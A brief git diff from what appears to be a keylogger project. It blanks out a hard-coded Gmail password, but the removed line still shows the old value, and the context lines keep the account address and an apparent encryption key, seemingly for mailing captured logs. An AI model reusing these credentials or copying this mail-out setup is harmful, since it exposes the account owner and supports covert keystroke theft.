@@ -43,7 +43,7 @@ file_path = "C:\\Users\\Rose Allison\\PycharmProjects\\keylogger2\\Project"
 extend = '\\'
 file_merge = file_path + extend
 email_address = "cyberkeyproject@gmail.com"
-password = "WXYZ1456!"
+password = ""
 to_address = "cyberkeyproject@gmail.com"
 
 key = '-PGjQVgJkPZ0gpUPRJ2HiwjIYdAriDFaTaAE0-PR24w='
